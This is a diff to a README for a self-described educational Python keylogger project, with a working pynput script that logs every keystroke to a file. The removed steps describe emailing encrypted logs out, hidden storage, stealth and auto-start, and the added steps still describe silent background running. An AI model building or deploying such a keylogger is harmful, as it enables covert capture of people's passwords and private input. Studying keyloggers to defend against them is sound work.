@@ -2,76 +2,89 @@
 
 ## Objective
 
-This project involves building a Python-based keylogger to record keyboard inputs for educational purposes and to demonstrate ethical hacking techniques. The goal is to understand how keyloggers operate, learn the principles of monitoring input devices, and emphasize the importance of securing systems against such threats.
+This project involves building a Python-based keylogger to record keyboard inputs for educational purposes and demonstrate ethical hacking techniques. The goal is to understand how keyloggers operate, learn the principles of monitoring input devices, and emphasize the importance of securing systems against such threats.
 
-> **Note:** This project is strictly for educational use and ethical learning. 
+> **Note:** This project is strictly for educational use and ethical learning.
 
-### Skills Learned
+---
+
+## Skills Learned
 
 - Proficiency in Python programming for interacting with operating system APIs.
 - Understanding of keylogging mechanisms and input capture techniques.
 - Hands-on experience with libraries like `pynput` for monitoring keyboard inputs.
-- Knowledge of secure data handling and encryption of sensitive logs.
+- Knowledge of secure data handling and logging practices.
 - Awareness of ethical hacking principles and system protection strategies.
 
-### Tools Used
+---
 
-- Python 3 for development.
+## Tools Used
+
+- **Python 3** for development.
 - Libraries:
   - `pynput` for capturing keyboard inputs.
-  - `smtplib` for sending logs via email (optional).
-  - `os` and `time` for file management and scheduling.
-- Virtual Machine (e.g., VirtualBox) for safe testing.
+  - `logging` for structured logging.
+  - `os` for directory management.
+- **Virtual Machine** (e.g., VirtualBox) for safe testing.
 
 ---
 
 ## Steps
 
 1. **Set Up the Environment:**
-   - Installed Python 3 and required libraries (`pynput`, `smtplib`).
-   - Created a virtual environment to manage dependencies.
+   - Installed Python 3 and the `pynput` library.
+   - Configured the environment for secure logging and file management.
 
 2. **Capture Keyboard Inputs:**
    - Used the `pynput` library to monitor and record keyboard inputs.
-   - Stored logs in a secure text file or encrypted format.
+   - Ensured the logs were stored securely in a designated directory.
 
-3. **Encrypt and Store Logs:**
-   - Implemented basic encryption using the `cryptography` library to secure logged data.
-   - Ensured logs were stored in an inaccessible or hidden directory for demonstration purposes.
+3. **Implement Structured Logging:**
+   - Utilized the `logging` library to format and store captured keystrokes.
+   - Designed log files with timestamps for traceability.
 
-4. **Optional: Send Logs via Email:**
-   - Configured the `smtplib` library to send encrypted logs to a preconfigured email address securely.
-   - Utilized environment variables for storing sensitive email credentials.
+4. **Set Up Logging Directory:**
+   - Created a specific directory (`C:\Users\HP\OneDrive\Documents\cisco`) for storing log files.
+   - Ensured proper permissions and access control for the directory.
 
-5. **Implement Stealth Mode:**
-   - Ensured the script runs silently in the background without alerting the user.
-   - Set up auto-start functionality on the test environment for educational purposes.
+5. **Implement Background Functionality:**
+   - Set up the keylogger to run silently in the background without user interruption.
 
 6. **Test and Debug:**
-   - Tested the keylogger on a virtual machine to ensure it captures inputs accurately.
-   - Validated encryption and email delivery functionality.
+   - Tested the keylogger in a secure virtual machine to validate input capture and log storage.
+   - Debugged any issues with logging and file management.
 
 7. **Document Ethical Usage:**
-   - Clearly documented the ethical guidelines and educational intent of the project.
+   - Emphasized the ethical guidelines and educational purpose of the project.
 
 ---
 
 ## Example Code
 
-Here’s a basic implementation for capturing keystrokes:
+Here’s the implementation:
 
 ```python
-from pynput.keyboard import Listener
+from pynput.keyboard import Key, Listener
+import logging
 
-# Log file to store captured keystrokes
-log_file = "keylog.txt"
+# Directory where the log file will be saved
+log_dir = r"C:\Users\HP\OneDrive\Documents\cisco"
 
-# Function to log keys
-def log_key(key):
-    with open(log_file, "a") as f:
-        key_str = str(key).replace("'", "")
-        f.write(key_str + "\n")
+# Set up logging
+logging.basicConfig(
+    filename=log_dir + r"\keylog.txt", 
+    level=logging.DEBUG, 
+    format='%(asctime)s: %(message)s'
+)
 
-# Start the listener
-with Listener(on_press=log_key) as listener:
+# Function to be called when a key is pressed
+def on_press(key):
+    try:
+        # Log the key pressed
+        logging.info(str(key))
+    except Exception as e:
+        logging.error(f"Error: {e}")
+
+# Set up the listener
+with Listener(on_press=on_press) as listener:
     listener.join()
